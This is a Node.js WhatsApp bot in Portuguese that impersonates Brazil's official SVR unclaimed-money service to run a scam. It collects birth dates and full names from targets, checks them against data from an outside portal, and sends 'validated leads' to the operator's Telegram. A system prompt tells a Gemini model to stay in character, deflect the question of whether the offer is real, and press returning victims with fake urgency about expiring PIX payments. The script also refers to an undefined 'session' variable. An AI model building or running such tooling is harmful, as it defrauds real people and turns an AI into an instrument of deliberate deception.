const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const API_URL = process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app';
const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "";

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const systemPrompt = `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber). Seu objetivo ÚNICO é ajudar o usuário a completar a validação de segurança para receber o dinheiro dele. 
        Instruções:
        1. Seja profissional, educado e direto.
        2. Se o usuário perguntar algo fora do assunto (ex: 'quem é você?', 'como funciona?', 'isso é real?'), responda de forma convincente e diga que para prosseguir ele DEVE seguir as instruções de segurança e digitar o dado solicitado.
        3. Nunca saia do personagem.
        4. Use negrito em palavras chave.
        5. Mantenha as respostas curtas (máximo 3 frases).`;

        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário disse: ${userMessage}\nO que você responde para trazê-lo de volta ao foco?` }] }]
        });
        return response.data.candidates[0].content.parts[0].text;
    } catch (e) {
        return "Para sua segurança, prossiga com a validação dos dados solicitados acima.";
    }
}

const botId = process.argv.find(arg => arg.startsWith('--id='))?.split('=')[1] || 'main';

const client = new Client({
    authStrategy: new LocalAuth({ clientId: `session-${botId}` }),
    puppeteer: {
        executablePath: (function() {
            const paths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable'];
            const found = paths.find(p => fs.existsSync(p));
            console.log(`🌐 NAVEGADOR: ${found || 'PADRÃO'}`);
            return found || null;
        })(),
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
        headless: 'new'
    }
});

async function notifyTelegram(text) {
    if (!TG_TOKEN || !CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text,
            parse_mode: 'HTML'
        });
    } catch (e) { console.error("❌ Erro Telegram:", e.message); }
}

client.on('qr', (qr) => {
    console.log('💠 QR CODE RECEBIDO!');
    qrcode.generate(qr, { small: true });
    notifyTelegram(`🖼️ <b>NOVO QR CODE (Slot: ${botId})</b>\n\nEscaneie para conectar o atendimento.`);
});

client.on('ready', () => {
    console.log(`✅ BOT ${botId} ONLINE!`);
    notifyTelegram(`🟢 <b>BOT ONLINE (Slot: ${botId})</b>\nO atendimento automático está ativo.`);
    fs.writeFileSync(`bot-status-${botId}.json`, JSON.stringify({ status: 'CONNECTED', adminName: 'Principal', lastUpdate: Date.now() }));
});

client.on('disconnected', () => {
    notifyTelegram(`⚠️ <b>BOT DESCONECTADO (Slot: ${botId})</b>`);
});

const chatSessionsFile = `chat-sessions-${botId}.json`;
let chatSessions = new Map();

// Carregar sessões persistentes
if (fs.existsSync(chatSessionsFile)) {
    try {
        const data = JSON.parse(fs.readFileSync(chatSessionsFile, 'utf-8'));
        chatSessions = new Map(Object.entries(data));
        console.log(`📦 ${chatSessions.size} sessões carregadas.`);
    } catch (e) { console.error("Erro ao carregar sessões:", e.message); }
}

function saveSessions() {
    try {
        const data = Object.fromEntries(chatSessions);
        fs.writeFileSync(chatSessionsFile, JSON.stringify(data));
    } catch (e) { console.error("Erro ao salvar sessões:", e.message); }
}

client.on('message_create', async (msg) => {
    const text = msg.body || "";
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
    
    const targetChatId = msg.fromMe ? msg.to : msg.from;
    if (!targetChatId) return;

    // Persistir o último contato ativo para facilitar comandos no Telegram
    if (!msg.fromMe) {
        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
    }

    const currentSession = chatSessions.get(targetChatId);

    // 1. GATILHO INICIAL (Pode vir de mim ou do lead)
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) {
            console.log(`⏳ Sessão já ativa para ${targetChatId}. Ignorando duplicata.`);
            return;
        }

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
        
        console.log(`🚀 Iniciando atendimento para: ${targetChatId} (User: ${userId})`);
        
        let expectedData = null;
        if (userId) {
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
                expectedData = res.data;
            } catch (e) { console.error(`❌ Erro ao buscar dados do portal para ${userId}:`, e.message); }
        }

        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
        saveSessions();
        
        setTimeout(async () => {
            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
        }, 2000);
        return;
    }

    // 2. INTERVENÇÃO HUMANA (Se eu mandei algo que NÃO é o gatilho)
    if (msg.fromMe) {
        if (currentSession && currentSession.mode !== 'human') {
            console.log(`👤 ATENDENTE ASSUMIU: Silenciando robô para ${targetChatId}`);
            chatSessions.set(targetChatId, { mode: 'human' });
            saveSessions();
            notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO</b>\nO robô foi silenciado para o lead: <code>${targetChatId}</code>`);
        }
        return;
    }

    // 3. PROCESSAMENTO DE MENSAGENS RECEBIDAS (De leads)
    if (!currentSession) {
        console.log(`ℹ️ Mensagem ignorada de ${targetChatId}: Sem sessão ativa.`);
        return;
    }
    
    if (currentSession.mode !== 'bot') {
        console.log(`ℹ️ Mensagem de ${targetChatId} ignorada: Modo ${currentSession.mode}.`);
        return;
    }

    // VERIFICAÇÃO DE REENGAJAMENTO (Se demorou mais de 30 minutos)
    const now = Date.now();
    const minutesAway = session.lastMsgTime ? Math.floor((now - session.lastMsgTime) / (1000 * 60)) : 0;
    
    if (minutesAway >= 30) {
        console.log(`🔄 Lead ${targetChatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
        const reengagementMsg = await askAI("reengajamento_agressivo", `O usuário voltou após ${minutesAway} minutos de inatividade. Seja EXTREMAMENTE tentador, diga que o valor dele de resgate está quase expirando e que ele precisa terminar a validação AGORA para não perder o PIX de hoje.`);
        await msg.reply(`👋 *Que bom que você retornou!*\n\n${reengagementMsg}`);
        session.lastMsgTime = now;
        chatSessions.set(targetChatId, session);
        saveSessions();
        return; 
    }

    session.lastMsgTime = now; 
    console.log(`📩 Lead (${targetChatId}) respondeu: "${text}"`);
    
    const chat = await msg.getChat();
    await chat.sendStateTyping();

    if (session.step === 1) {
        const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
        const typedDate = text.trim();
        
        if (dateRegex.test(typedDate)) {
            if (session.expectedData?.birthDate && typedDate !== session.expectedData.birthDate.trim()) {
                await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com o portal.\n\nPor favor, digite a data **correta**.`);
                return;
            }
            session.step = 2;
            session.birthDate = typedDate;
            chatSessions.set(targetChatId, session);
            saveSessions();
            await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
        } else {
            const aiReply = await askAI("validacao_data", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
        }
    } else if (session.step === 2) {
        const typedName = text.trim();
        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (session.expectedData?.fullName) {
                const portalName = session.expectedData.fullName.toLowerCase().trim();
                if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
                    return;
                }
            }

            await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
              `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
              `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
              `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
            
            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
            chatSessions.delete(targetChatId);
            saveSessions();
        } else {
            const aiReply = await askAI("validacao_nome", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo (Nome e Sobrenome).`);
        }
    }
});

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    const files = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of files) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            
            console.log(`📤 Enviando comando externo para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);
            
            fs.unlinkSync(cmdPath); 
        } catch (e) {
            console.error("❌ Erro ao processar comando externo:", e.message);
        }
    }
}, 3000);

client.initialize();

